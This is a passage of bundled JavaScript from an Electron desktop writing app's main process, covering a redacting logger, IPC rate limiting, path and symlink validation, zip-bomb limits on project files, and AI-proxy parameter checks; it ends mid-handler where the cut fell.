"use strict";
var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);

// electron/main.ts
var main_exports = {};
__export(main_exports, {
  assertRealPathInside: () => assertRealPathInside,
  isInsideDataDir: () => isInsideDataDir,
  isSafeBackupPath: () => isSafeBackupPath,
  isSafeExportFilePath: () => isSafeExportFilePath,
  isSafeIdentifier: () => isSafeIdentifier,
  isSafeProjectFilePath: () => isSafeProjectFilePath,
  isValidProjectFileData: () => isValidProjectFileData,
  resolveRealPath: () => resolveRealPath,
  validateAIProxyLLMParams: () => validateAIProxyLLMParams,
  validateAIProxyParams: () => validateAIProxyParams
});
module.exports = __toCommonJS(main_exports);
var import_electron8 = require("electron");
var import_node_path15 = __toESM(require("node:path"), 1);

// electron/logger.ts
var import_node_fs = __toESM(require("node:fs"), 1);
var import_node_path = __toESM(require("node:path"), 1);
var LEVEL_ORDER = {
  debug: 0,
  info: 1,
  warn: 2,
  error: 3
};
var MAX_LOG_SIZE = 5 * 1024 * 1024;
var MAX_BACKUPS = 3;
var SENSITIVE_KEY_RE = /^(apikey|api_key|secret|token|password|passwd|auth|authorization|access_token|refresh_token)$/i;
var MAX_FIELD_VALUE_LEN = 100;
var Logger = class {
  level = "info";
  logFilePath = null;
  initialized = false;
  // 注入日志目录（主进程在 app.whenReady 后调用）。
  // 调用后日志会同步写入 <logDir>/main.log；未调用时仅输出到 console
  setLogDir(logDir) {
    try {
      import_node_fs.default.mkdirSync(logDir, { recursive: true });
      this.logFilePath = import_node_path.default.join(logDir, "main.log");
      this.initialized = true;
    } catch (e) {
      console.error("logger.setLogDir failed", e);
    }
  }
  // 重置内部状态：仅供单测隔离使用
  reset() {
    this.level = "info";
    this.logFilePath = null;
    this.initialized = false;
  }
  setLevel(level) {
    this.level = level;
  }
  getLevel() {
    return this.level;
  }
  isInitialized() {
    return this.initialized;
  }
  debug(msg, fields) {
    this.write("debug", msg, fields);
  }
  info(msg, fields) {
    this.write("info", msg, fields);
  }
  warn(msg, fields) {
    this.write("warn", msg, fields);
  }
  // error 接受 Error 实例或 LogFields：传 Error 时自动提取 message + stack
  error(msg, fields) {
    const f = fields instanceof Error ? { error: fields.message, stack: fields.stack } : fields;
    this.write("error", msg, f);
  }
  // 审计日志：记录安全相关事件（路径校验失败、IPC 入参拒绝、加解密失败等）。
  // 输出级别为 info（生产默认级别即可看到），单独的 [AUDIT] 前缀 + category 字段
  // 方便后续从日志文件按类别筛选安全事件
  audit(category, message, fields) {
    this.write("info", `[AUDIT] [${category}] ${message}`, fields);
  }
  // public write：供 IPC logger:write handler 转发渲染层日志使用。
  // 渲染层 catch 块通过 window.electronAPI.logger.write(...) 把错误统一到主进程日志文件，
  // 解决渲染层 console.error 仅出现在 devtools、生产环境用户无法提供日志的问题
  write(level, msg, fields) {
    if (LEVEL_ORDER[level] < LEVEL_ORDER[this.level]) return;
    const line = this.formatLine(level, msg, fields);
    const consoleFn = level === "error" ? console.error : level === "warn" ? console.warn : console.log;
    consoleFn(line);
    if (this.logFilePath) {
      try {
        this.maybeRotate();
        import_node_fs.default.appendFileSync(this.logFilePath, line + "\n", "utf-8");
      } catch (e) {
        console.error("logger.write to file failed", e);
      }
    }
  }
  formatLine(level, msg, fields) {
    const ts = (/* @__PURE__ */ new Date()).toISOString();
    const levelTag = level.toUpperCase().padEnd(5);
    let line = `[${ts}] [${levelTag}] ${msg}`;
    if (fields && Object.keys(fields).length > 0) {
      const sanitized = this.sanitizeFields(fields);
      const kv = Object.entries(sanitized).map(([k, v]) => `${k}=${this.formatValue(v)}`).join(" ");
      line += ` { ${kv} }`;
    }
    return line;
  }
  sanitizeFields(fields) {
    const out = {};
    for (const [k, v] of Object.entries(fields)) {
      if (SENSITIVE_KEY_RE.test(k)) {
        out[k] = "[REDACTED]";
      } else {
        out[k] = v;
      }
    }
    return out;
  }
  formatValue(v) {
    if (v === null) return "null";
    if (v === void 0) return "undefined";
    if (typeof v === "number" || typeof v === "boolean") return String(v);
    if (v.length === 0) return '""';
    const truncated = v.length > MAX_FIELD_VALUE_LEN ? v.slice(0, MAX_FIELD_VALUE_LEN) + "\u2026" : v;
    if (/[\s"'={}|]/.test(truncated)) {
      return `"${truncated.replace(/"/g, '\\"')}"`;
    }
    return truncated;
  }
  // 文件轮转：main.log 超过 MAX_LOG_SIZE 时，
  // main.log.3 删除，main.log.2 -> .3，main.log.1 -> .2，main.log -> .1
  // 从最老的备份开始处理，避免覆盖
  maybeRotate() {
    if (!this.logFilePath) return;
    try {
      const stats = import_node_fs.default.statSync(this.logFilePath);
      if (stats.size < MAX_LOG_SIZE) return;
    } catch {
      return;
    }
    for (let i = MAX_BACKUPS; i >= 1; i--) {
      const src = i === 1 ? this.logFilePath : `${this.logFilePath}.${i - 1}`;
      const dst = `${this.logFilePath}.${i}`;
      try {
        if (i === MAX_BACKUPS) {
          try {
            import_node_fs.default.unlinkSync(dst);
          } catch {
          }
        }
        import_node_fs.default.renameSync(src, dst);
      } catch {
      }
    }
  }
};
var logger = new Logger();

// electron/handlers/shared.ts
var import_electron2 = require("electron");
var import_node_path3 = __toESM(require("node:path"), 1);
var import_promises2 = __toESM(require("node:fs/promises"), 1);

// electron/ipcRateLimit.ts
var RateLimitError = class extends Error {
  constructor(channel, senderId, message) {
    super(message);
    this.channel = channel;
    this.senderId = senderId;
    this.name = "RateLimitError";
  }
};
var DEFAULT_CONFIGS = {
  // 读操作组（容量 10，每秒补充 1）
  "storage:read": { capacity: 10, refillPerSec: 1 },
  "storage:readFileBase64": { capacity: 10, refillPerSec: 1 },
  "storage:listProjectDirs": { capacity: 10, refillPerSec: 1 },
  "projectFile:read": { capacity: 10, refillPerSec: 1 },
  "projectFile:validate": { capacity: 10, refillPerSec: 1 },
  "projectFile:listBackups": { capacity: 10, refillPerSec: 1 },
  "file:readDataURL": { capacity: 10, refillPerSec: 1 },
  "system:checkCrashRecovery": { capacity: 5, refillPerSec: 0.5 },
  "ai:loadSettings": { capacity: 5, refillPerSec: 0.5 },
  // 写操作组（容量 5，每秒补充 0.33 = 20/min）
  "storage:write": { capacity: 5, refillPerSec: 1 / 3 },
  "storage:remove": { capacity: 5, refillPerSec: 1 / 3 },
  "storage:patchProjects": { capacity: 5, refillPerSec: 1 / 3 },
  "storage:writeFile": { capacity: 5, refillPerSec: 1 / 3 },
  "storage:writeFileBuffer": { capacity: 5, refillPerSec: 1 / 3 },
  // 导出文件专用通道（容量 5，每秒补充 0.33 = 20/min）
  // 与 storage:writeFileBuffer 同档：导出是用户主动操作频率天然受限，
  // 但仍需防 XSS 后刷写向用户目录写入大量文件
  "export:writeFile": { capacity: 5, refillPerSec: 1 / 3 },
  "export:writeFileBuffer": { capacity: 5, refillPerSec: 1 / 3 },
  "storage:backupProject": { capacity: 3, refillPerSec: 0.2 },
  "projectFile:write": { capacity: 5, refillPerSec: 1 / 3 },
  "projectFile:backup": { capacity: 3, refillPerSec: 0.2 },
  "projectFile:restoreBackup": { capacity: 3, refillPerSec: 0.2 },
  "ai:saveSettings": { capacity: 3, refillPerSec: 0.2 },
  "material:saveAttachment": { capacity: 3, refillPerSec: 0.2 },
  "material:deleteAttachment": { capacity: 5, refillPerSec: 1 / 3 },
  "file:openExternal": { capacity: 5, refillPerSec: 1 / 3 },
  // AI 调用（容量 2，每秒补充 0.1 = 6/min）
  "ai:proxyStream": { capacity: 2, refillPerSec: 0.1 },
  "ai:abort": { capacity: 10, refillPerSec: 1 },
  // 文件对话框（容量 2，每秒补充 0.16 = 10/min）
  "projectFile:openDialog": { capacity: 2, refillPerSec: 1 / 6 },
  "projectFile:saveDialog": { capacity: 2, refillPerSec: 1 / 6 },
  "dialog:selectFile": { capacity: 2, refillPerSec: 1 / 6 },
  "dialog:saveFile": { capacity: 2, refillPerSec: 1 / 6 },
  // 渲染层日志上报（容量 10，每秒补充 1 = 60/min）
  // 渲染层 catch 块 + window.onerror + unhandledrejection 都会通过此 channel 转发到主进程日志。
  // 容量 10 允许 burst（短时间内多个错误同时上报），refillPerSec=1 防止 XSS 后刷日志撑爆磁盘
  "logger:write": { capacity: 10, refillPerSec: 1 }
};
var GLOBAL_DEFAULT = { capacity: 10, refillPerSec: 1 };
function createIpcRateLimiter() {
  const buckets = /* @__PURE__ */ new Map();
  const customConfigs = /* @__PURE__ */ new Map();
  const getConfig = (channel) => {
    return customConfigs.get(channel) ?? DEFAULT_CONFIGS[channel] ?? GLOBAL_DEFAULT;
  };
  const refill = (state, config, now) => {
    const elapsed = (now - state.lastRefillTs) / 1e3;
    if (elapsed <= 0) return;
    const refilled = state.tokens + elapsed * config.refillPerSec;
    state.tokens = Math.min(config.capacity, refilled);
    state.lastRefillTs = now;
  };
  return {
    check(channel, senderId) {
      const config = getConfig(channel);
      const key = `${channel}:${senderId}`;
      const now = Date.now();
      let state = buckets.get(key);
      if (!state) {
        state = { tokens: config.capacity, lastRefillTs: now };
        buckets.set(key, state);
      } else {
        refill(state, config, now);
      }
      if (state.tokens < 1) {
        return new RateLimitError(
          channel,
          senderId,
          `IPC rate limit exceeded: channel=${channel} senderId=${senderId} (capacity=${config.capacity} refillPerSec=${config.refillPerSec})`
        );
      }
      state.tokens -= 1;
      return null;
    },
    configure(channel, config) {
      customConfigs.set(channel, config);
    },
    reset() {
      buckets.clear();
      customConfigs.clear();
    },
    getSnapshot() {
      return new Map(buckets);
    }
  };
}
var ipcRateLimiter = createIpcRateLimiter();

// electron/handlers/security.ts
var import_electron = require("electron");
var import_node_path2 = __toESM(require("node:path"), 1);
var import_promises = __toESM(require("node:fs/promises"), 1);
function getAllowedProjectFileRoots() {
  const home = import_electron.app.getPath("home");
  const roots = [
    home,
    import_node_path2.default.join(home, "Documents"),
    import_node_path2.default.join(home, "Desktop"),
    import_node_path2.default.join(home, "Downloads"),
    import_electron.app.getPath("userData")
  ];
  return Array.from(new Set(roots.map((p) => import_node_path2.default.resolve(p))));
}
function isSafeProjectFilePath(filePath) {
  if (typeof filePath !== "string" || !filePath) return false;
  if (filePath.includes("\0") || filePath.includes("\n") || filePath.includes("\r")) return false;
  if (!import_node_path2.default.isAbsolute(filePath)) return false;
  if (!filePath.toLowerCase().endsWith(".cwp")) return false;
  const normalized = import_node_path2.default.normalize(filePath);
  if (!normalized.toLowerCase().endsWith(".cwp")) return false;
  const allowedRoots = getAllowedProjectFileRoots();
  const isInsideAllowed = allowedRoots.some(
    (root) => normalized === root || normalized.startsWith(root + import_node_path2.default.sep)
  );
  if (!isInsideAllowed) return false;
  return true;
}
function isSafeBackupPath(p) {
  if (typeof p !== "string" || !p || p.includes("\0")) return false;
  const resolved = import_node_path2.default.resolve(p);
  const backupsRoot = getBackupsDir();
  return resolved === backupsRoot || resolved.startsWith(backupsRoot + import_node_path2.default.sep);
}
var EXPORT_ALLOWED_EXTENSIONS = /* @__PURE__ */ new Set([
  ".txt",
  ".md",
  ".markdown",
  ".html",
  ".htm",
  ".docx",
  ".pdf",
  ".epub"
]);
function isSafeExportFilePath(filePath) {
  if (typeof filePath !== "string" || !filePath) return false;
  if (filePath.includes("\0") || filePath.includes("\n") || filePath.includes("\r")) return false;
  if (!import_node_path2.default.isAbsolute(filePath)) return false;
  const lower = filePath.toLowerCase();
  const ext = import_node_path2.default.extname(lower);
  if (!EXPORT_ALLOWED_EXTENSIONS.has(ext)) return false;
  const normalized = import_node_path2.default.normalize(filePath);
  const normalizedExt = import_node_path2.default.extname(normalized.toLowerCase());
  if (!EXPORT_ALLOWED_EXTENSIONS.has(normalizedExt)) return false;
  const allowedRoots = getAllowedProjectFileRoots();
  const isInsideAllowed = allowedRoots.some(
    (root) => normalized === root || normalized.startsWith(root + import_node_path2.default.sep)
  );
  if (!isInsideAllowed) return false;
  return true;
}
function isInsideDataDir(filePath) {
  if (typeof filePath !== "string" || !filePath || filePath.includes("\0")) return false;
  const resolved = import_node_path2.default.resolve(filePath);
  const dataDir = getDataDir();
  return resolved === dataDir || resolved.startsWith(dataDir + import_node_path2.default.sep);
}
async function resolveRealPath(filePath) {
  try {
    return await import_promises.default.realpath(filePath);
  } catch (e) {
    const code = e.code;
    if (code === "ENOENT") {
      const parent = import_node_path2.default.dirname(filePath);
      const base = import_node_path2.default.basename(filePath);
      try {
        const realParent = await import_promises.default.realpath(parent);
        return import_node_path2.default.join(realParent, base);
      } catch {
        return null;
      }
    }
    return null;
  }
}
async function assertRealPathInside(filePath, allowedRoots) {
  const real = await resolveRealPath(filePath);
  if (real === null) return false;
  const realRoots = await Promise.all(
    allowedRoots.map(async (r) => {
      const rr = await resolveRealPath(r);
      return rr ?? r;
    })
  );
  return realRoots.some(
    (root) => real === root || real.startsWith(root + import_node_path2.default.sep)
  );
}
var MAX_IDENTIFIER_LENGTH = 256;
function isSafeIdentifier(id) {
  if (typeof id !== "string" || !id) return false;
  if (id.length > MAX_IDENTIFIER_LENGTH) return false;
  if (id.includes("..") || id.includes("/") || id.includes("\\") || id.includes("\0")) return false;
  return true;
}
function isValidProjectFileData(data) {
  if (!data || typeof data !== "object") return false;
  const d = data;
  if (!d.project || typeof d.project !== "object" || Array.isArray(d.project)) return false;
  const arrayFields = ["chapters", "characters", "settingCategories", "settingItems", "foreshadows", "materials"];
  for (const f of arrayFields) {
    if (!Array.isArray(d[f])) return false;
  }
  if (d.versions != null && (typeof d.versions !== "object" || Array.isArray(d.versions))) return false;
  return true;
}
var AI_PROXY_VALID_PROVIDERS = /* @__PURE__ */ new Set(["mock", "local", "openai", "deepseek"]);
var AI_PROXY_VALID_ROLES = /* @__PURE__ */ new Set(["system", "user", "assistant"]);
var AI_PROXY_MAX_MESSAGES = 200;
var AI_PROXY_MAX_CONTENT_LEN = 2e5;
var AI_PROXY_MAX_BASEURL_LEN = 1024;
var AI_PROXY_MAX_MODEL_LEN = 128;
var AI_PROXY_MAX_TOKENS = 8192;
var AI_PROXY_REQUEST_ID_RE = /^[a-zA-Z0-9_-]{1,128}$/;
function validateAIProxyParams(params) {
  if (!params || typeof params !== "object") {
    return "ai:proxyStream: params must be an object";
  }
  const p = params;
  if (typeof p.provider !== "string" || !AI_PROXY_VALID_PROVIDERS.has(p.provider)) {
    return "ai:proxyStream: invalid provider";
  }
  if (p.baseUrl !== void 0 && p.baseUrl !== "") {
    if (typeof p.baseUrl !== "string" || p.baseUrl.length > AI_PROXY_MAX_BASEURL_LEN) {
      return "ai:proxyStream: invalid baseUrl";
    }
  }
  if (p.model !== void 0 && p.model !== "") {
    if (typeof p.model !== "string" || p.model.length > AI_PROXY_MAX_MODEL_LEN) {
      return "ai:proxyStream: invalid model";
    }
  }
  if (!Array.isArray(p.messages) || p.messages.length === 0) {
    return "ai:proxyStream: messages must be a non-empty array";
  }
  if (p.messages.length > AI_PROXY_MAX_MESSAGES) {
    return `ai:proxyStream: too many messages (max ${AI_PROXY_MAX_MESSAGES})`;
  }
  for (let i = 0; i < p.messages.length; i++) {
    const msg = p.messages[i];
    if (!msg || typeof msg !== "object") {
      return `ai:proxyStream: message[${i}] must be an object`;
    }
    const m = msg;
    if (typeof m.role !== "string" || !AI_PROXY_VALID_ROLES.has(m.role)) {
      return `ai:proxyStream: message[${i}] has invalid role`;
    }
    if (typeof m.content !== "string") {
      return `ai:proxyStream: message[${i}] content must be string`;
    }
    if (m.content.length > AI_PROXY_MAX_CONTENT_LEN) {
      return `ai:proxyStream: message[${i}] content too long (max ${AI_PROXY_MAX_CONTENT_LEN} chars)`;
    }
  }
  if (typeof p.temperature !== "number" || !Number.isFinite(p.temperature) || p.temperature < 0 || p.temperature > 2) {
    return "ai:proxyStream: invalid temperature (must be finite number in [0, 2])";
  }
  if (typeof p.maxTokens !== "number" || !Number.isFinite(p.maxTokens) || !Number.isInteger(p.maxTokens) || p.maxTokens < 1 || p.maxTokens > AI_PROXY_MAX_TOKENS) {
    return `ai:proxyStream: invalid maxTokens (must be integer in [1, ${AI_PROXY_MAX_TOKENS}])`;
  }
  if (typeof p.requestId !== "string" || !AI_PROXY_REQUEST_ID_RE.test(p.requestId)) {
    return "ai:proxyStream: invalid requestId (must match ^[a-zA-Z0-9_-]{1,128}$)";
  }
  return null;
}
function validateAIProxyLLMParams(params) {
  if (!params || typeof params !== "object") {
    return "ai:proxyLLM: params must be an object";
  }
  const p = params;
  if (typeof p.provider !== "string" || !AI_PROXY_VALID_PROVIDERS.has(p.provider)) {
    return "ai:proxyLLM: invalid provider";
  }
  if (p.baseUrl !== void 0 && p.baseUrl !== "") {
    if (typeof p.baseUrl !== "string" || p.baseUrl.length > AI_PROXY_MAX_BASEURL_LEN) {
      return "ai:proxyLLM: invalid baseUrl";
    }
  }
  if (p.model !== void 0 && p.model !== "") {
    if (typeof p.model !== "string" || p.model.length > AI_PROXY_MAX_MODEL_LEN) {
      return "ai:proxyLLM: invalid model";
    }
  }
  if (typeof p.prompt !== "string" || p.prompt.length === 0) {
    return "ai:proxyLLM: prompt must be a non-empty string";
  }
  if (p.prompt.length > AI_PROXY_MAX_CONTENT_LEN) {
    return `ai:proxyLLM: prompt too long (max ${AI_PROXY_MAX_CONTENT_LEN} chars)`;
  }
  if (p.systemPrompt !== void 0 && p.systemPrompt !== "") {
    if (typeof p.systemPrompt !== "string" || p.systemPrompt.length > AI_PROXY_MAX_CONTENT_LEN) {
      return `ai:proxyLLM: systemPrompt too long (max ${AI_PROXY_MAX_CONTENT_LEN} chars)`;
    }
  }
  if (typeof p.temperature !== "number" || !Number.isFinite(p.temperature) || p.temperature < 0 || p.temperature > 2) {
    return "ai:proxyLLM: invalid temperature (must be finite number in [0, 2])";
  }
  if (typeof p.maxTokens !== "number" || !Number.isFinite(p.maxTokens) || !Number.isInteger(p.maxTokens) || p.maxTokens < 1 || p.maxTokens > AI_PROXY_MAX_TOKENS) {
    return `ai:proxyLLM: invalid maxTokens (must be integer in [1, ${AI_PROXY_MAX_TOKENS}])`;
  }
  if (typeof p.requestId !== "string" || !AI_PROXY_REQUEST_ID_RE.test(p.requestId)) {
    return "ai:proxyLLM: invalid requestId (must match ^[a-zA-Z0-9_-]{1,128}$)";
  }
  return null;
}

// electron/handlers/shared.ts
var FILE_VERSION = "1.0.0";
var MAX_STORAGE_VALUE_SIZE = 50 * 1024 * 1024;
var RATE_LIMIT_AUDIT_WINDOW_MS = 6e4;
var rateLimitAuditState = /* @__PURE__ */ new Map();
function clearRateLimitAuditTimers() {
  for (const entry of rateLimitAuditState.values()) {
    if (entry.timer) {
      clearTimeout(entry.timer);
      entry.timer = null;
    }
  }
  rateLimitAuditState.clear();
}
function safeIpcHandle(channel, listener) {
  try {
    import_electron2.ipcMain.removeHandler(channel);
  } catch {
  }
  import_electron2.ipcMain["handle"](channel, (event, ...args) => {
    const rateLimitError = ipcRateLimiter.check(channel, event.sender.id);
    if (rateLimitError) {
      const existing = rateLimitAuditState.get(channel);
      if (existing && existing.timer) {
        existing.count++;
      } else {
        logger.audit("security.rate_limit", "IPC rejected: rate limit exceeded", {
          channel,
          senderId: rateLimitError.senderId
        });
        const entry = { count: 1, timer: null };
        entry.timer = setTimeout(() => {
          if (entry.count > 1) {
            logger.audit("security.rate_limit", `rate limit suppressed (\xD7${entry.count} in last 60s)`, { channel });
          }
          rateLimitAuditState.delete(channel);
        }, RATE_LIMIT_AUDIT_WINDOW_MS);
        rateLimitAuditState.set(channel, entry);
      }
      throw rateLimitError;
    }
    return listener(event, ...args);
  });
}
var ALLOWED_GLOBAL_STORAGE_KEYS = /* @__PURE__ */ new Set([
  "projects",
  "recovery_draft",
  "app_migration_version",
  "lastOpenedProject"
]);
var READ_ONLY_STORAGE_KEYS = /* @__PURE__ */ new Set([
  // 暂无 key 需要走 READ_ONLY 路径；aiSettings 已移除
]);
function isValidStorageKey(key) {
  if (!key || typeof key !== "string") return false;
  if (key.includes("..") || key.includes("/") || key.includes("\\") || key.includes("\0")) return false;
  if (key.startsWith("project_")) {
    const rest = key.slice("project_".length);
    if (!rest) return false;
    const projectIdPart = rest.split("_")[0];
    if (!projectIdPart) return false;
    return true;
  }
  return ALLOWED_GLOBAL_STORAGE_KEYS.has(key);
}
function getDataDir() {
  return import_electron2.app.getPath("userData");
}
function getProjectsDir() {
  return import_node_path3.default.join(getDataDir(), "projects");
}
function getBackupsDir() {
  return import_node_path3.default.join(getDataDir(), "backups");
}
function ensureDir(filePath) {
  return import_promises2.default.mkdir(import_node_path3.default.dirname(filePath), { recursive: true }).then(() => void 0);
}
function pathExists(p) {
  try {
    return import_promises2.default.access(p).then(() => true).catch(() => false);
  } catch {
    return Promise.resolve(false);
  }
}
var writeMutex = /* @__PURE__ */ new Map();
var isQuitting = false;
function setQuitting(value) {
  isQuitting = value;
}
async function awaitPendingWrites() {
  const pending = Array.from(writeMutex.values());
  if (pending.length === 0) return;
  logger.info("Quit: awaiting pending writes", { count: pending.length });
  await Promise.all(pending.map((p) => p.catch(() => {
  })));
}
async function withWriteMutex(key, fn) {
  if (isQuitting) {
    throw new Error("Application is quitting, new writes rejected");
  }
  const prev = writeMutex.get(key) || Promise.resolve();
  let release;
  const next = new Promise((r) => {
    release = r;
  });
  const stored = next.then(() => void 0);
  writeMutex.set(key, stored);
  try {
    await prev;
    const startTime = Date.now();
    try {
      return await fn();
    } finally {
      const heldMs = Date.now() - startTime;
      if (heldMs > 3e4) {
        logger.warn?.(`withWriteMutex ${key} held for ${heldMs}ms, possible resource leak`);
      }
    }
  } finally {
    release();
    if (writeMutex.get(key) === stored) {
      writeMutex.delete(key);
    }
  }
}
async function copyDir(src, dest) {
  await import_promises2.default.mkdir(dest, { recursive: true });
  const entries = await import_promises2.default.readdir(src, { withFileTypes: true });
  for (const entry of entries) {
    const srcPath = import_node_path3.default.join(src, entry.name);
    const destPath = import_node_path3.default.join(dest, entry.name);
    if (entry.isDirectory()) {
      await copyDir(srcPath, destPath);
    } else {
      await import_promises2.default.copyFile(srcPath, destPath);
    }
  }
}
var mainWindowRef = null;
function getMainWindow() {
  return mainWindowRef;
}
function setMainWindow(win) {
  mainWindowRef = win;
}
async function validatePathAndAudit(channel, filePath, validator, roots, options) {
  if (!validator(filePath)) {
    logger.audit("security.path", `${channel} rejected: invalid path`, { filePath: String(filePath) });
    return { ok: false, error: options?.invalidError ?? "\u975E\u6CD5\u7684\u8DEF\u5F84" };
  }
  const fp = filePath;
  if (!await assertRealPathInside(fp, roots)) {
    logger.audit("security.path", `${channel} rejected: realpath outside allowed roots (symlink?)`, { filePath: fp });
    return { ok: false, error: options?.outsideError ?? "\u8DEF\u5F84\u89E3\u6790\u5931\u8D25\u6216\u4F4D\u4E8E\u5141\u8BB8\u76EE\u5F55\u5916\uFF08\u53EF\u80FD\u662F\u7B26\u53F7\u94FE\u63A5\uFF09" };
  }
  return { ok: true };
}

// electron/handlers/projectFile.ts
var import_electron3 = require("electron");
var import_node_path4 = __toESM(require("node:path"), 1);
var import_promises3 = __toESM(require("node:fs/promises"), 1);
var import_node_crypto2 = require("node:crypto");
var import_jszip2 = __toESM(require("jszip"), 1);

// electron/handlers/projectFile.logic.ts
var import_node_crypto = require("node:crypto");
var import_jszip = __toESM(require("jszip"), 1);
var FILE_VERSION2 = "1.0.0";
var MAX_COMPRESSED_SIZE = 100 * 1024 * 1024;
var MAX_UNCOMPRESSED_SIZE = 500 * 1024 * 1024;
var MAX_VERSION_ENTRIES = 1e3;
var ProjectFileValidationError = class extends Error {
  kind;
  context;
  constructor(kind, message, context = {}) {
    super(message);
    this.name = "ProjectFileValidationError";
    this.kind = kind;
    this.context = context;
  }
};
function generateChecksum(data) {
  return (0, import_node_crypto.createHash)("sha256").update(data, "utf-8").digest("hex");
}
async function parseProjectFileFromBuffer(buffer) {
  if (buffer.length > MAX_COMPRESSED_SIZE) {
    throw new ProjectFileValidationError(
      "compressed-too-large",
      "\u5DE5\u7A0B\u6587\u4EF6\u8FC7\u5927\uFF08\u8D85\u8FC7 100MB\uFF09\uFF0C\u53EF\u80FD\u635F\u574F\u6216\u4E3A\u538B\u7F29\u70B8\u5F39",
      { size: buffer.length }
    );
  }
  const zip = await import_jszip.default.loadAsync(buffer);
  let totalUncompressed = 0;
  for (const entry of Object.values(zip.files)) {
    const uncompressed = entry._data?.uncompressedSize;
    if (typeof uncompressed === "number") {
      totalUncompressed += uncompressed;
      if (totalUncompressed > MAX_UNCOMPRESSED_SIZE) {
        throw new ProjectFileValidationError(
          "uncompressed-too-large",
          "\u5DE5\u7A0B\u6587\u4EF6\u89E3\u538B\u540E\u4F53\u79EF\u8FC7\u5927\uFF08\u8D85\u8FC7 500MB\uFF09\uFF0C\u53EF\u80FD\u4E3A\u538B\u7F29\u70B8\u5F39",
          { total: totalUncompressed }
        );
      }
    }
  }
  const metadataStr = await zip.file("metadata.json")?.async("string");
  if (!metadataStr) {
    throw new ProjectFileValidationError("missing-metadata", "\u7F3A\u5C11\u5143\u6570\u636E\u6587\u4EF6");
  }
  const metadata = JSON.parse(metadataStr);
  if (metadata.version !== FILE_VERSION2) {
    throw new ProjectFileValidationError(
      "incompatible-version",
      `\u4E0D\u517C\u5BB9\u7684\u6587\u4EF6\u7248\u672C: ${metadata.version}`
    );
  }
  const readJson = async (filename) => {
    const file = zip.file(filename);
    if (!file) return null;
    const content = await file.async("string");
    try {
      return JSON.parse(content);
    } catch {
      return null;
    }
  };
  const data = {
    metadata,
    project: await readJson("project.json"),
    chapters: await readJson("chapters.json") || [],
    characters: await readJson("characters.json") || [],
    settingCategories: await readJson("settingCategories.json") || [],
    settingItems: await readJson("settingItems.json") || [],
    foreshadows: await readJson("foreshadows.json") || [],
    materials: await readJson("materials.json") || [],
    versions: {}
  };
  const versionFiles = Object.keys(zip.files).filter(
    (name) => name.startsWith("versions/") && name.endsWith(".json")
  );
  if (versionFiles.length > MAX_VERSION_ENTRIES) {
    throw new ProjectFileValidationError(
      "too-many-versions",
      "\u5DE5\u7A0B\u6587\u4EF6\u5305\u542B\u8FC7\u591A\u7248\u672C\u5386\u53F2\u6761\u76EE\uFF08\u8D85\u8FC7 1000\uFF09\uFF0C\u53EF\u80FD\u635F\u574F",
      { count: versionFiles.length }
    );
  }
  for (const f of versionFiles) {
    const chapterId = f.slice("versions/".length, -5);
    data.versions[chapterId] = await readJson(f) || [];
  }
  if (!data.project || typeof data.project !== "object") {
    throw new ProjectFileValidationError("invalid-project", "\u5DE5\u7A0B\u6587\u4EF6\u7F3A\u5C11\u6709\u6548\u7684 project.json");
  }
  const arrayFieldNames = ["chapters", "characters", "settingCategories", "settingItems", "foreshadows", "materials"];
  for (const f of arrayFieldNames) {
    if (!Array.isArray(data[f])) {
      throw new ProjectFileValidationError(
        "invalid-array-field",
        `\u5DE5\u7A0B\u6587\u4EF6\u7684 ${f} \u6570\u636E\u4E0D\u662F\u6709\u6548\u6570\u7EC4`,
        { field: f }
      );
    }
  }
  return data;
}
async function generateProjectFileBuffer(data) {
  const zip = new import_jszip.default();
  const metadata = {
    version: FILE_VERSION2,
    createdAt: (/* @__PURE__ */ new Date()).toISOString(),
    updatedAt: (/* @__PURE__ */ new Date()).toISOString(),
    checksum: generateChecksum(JSON.stringify(data.project))
  };
  zip.file("metadata.json", JSON.stringify(metadata, null, 2));
  zip.file("project.json", JSON.stringify(data.project, null, 2));
  zip.file("chapters.json", JSON.stringify(data.chapters, null, 2));
  zip.file("characters.json", JSON.stringify(data.characters, null, 2));
  zip.file("settingCategories.json", JSON.stringify(data.settingCategories, null, 2));
  zip.file("settingItems.json", JSON.stringify(data.settingItems, null, 2));
  zip.file("foreshadows.json", JSON.stringify(data.foreshadows, null, 2));
  zip.file("materials.json", JSON.stringify(data.materials, null, 2));
  if (data.versions && typeof data.versions === "object" && Object.keys(data.versions).length > 0) {
    const versionsDir = zip.folder("versions");
    Object.entries(data.versions).forEach(([chapterId, chapterVersions]) => {
      versionsDir?.file(`${chapterId}.json`, JSON.stringify(chapterVersions, null, 2));
    });
  }
  return await zip.generateAsync({ type: "nodebuffer" });
}
function formatBackupTimestamp(date = /* @__PURE__ */ new Date()) {
  return date.toISOString().replace(/[:.]/g, "-");
}

// electron/handlers/projectFile.ts
function registerProjectFileHandlers() {
  safeIpcHandle("projectFile:read", async (_event, filePath) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "projectFile:read",
        filePath,
        isSafeProjectFilePath,
        getAllowedProjectFileRoots(),
        { invalidError: "\u975E\u6CD5\u7684\u5DE5\u7A0B\u6587\u4EF6\u8DEF\u5F84" }
      );
      if (!pathCheck.ok) return { success: false, error: pathCheck.error };
      const buffer = await import_promises3.default.readFile(filePath);
      try {
        const data = await parseProjectFileFromBuffer(buffer);
        return { success: true, data };
      } catch (e) {
        if (e instanceof ProjectFileValidationError) {
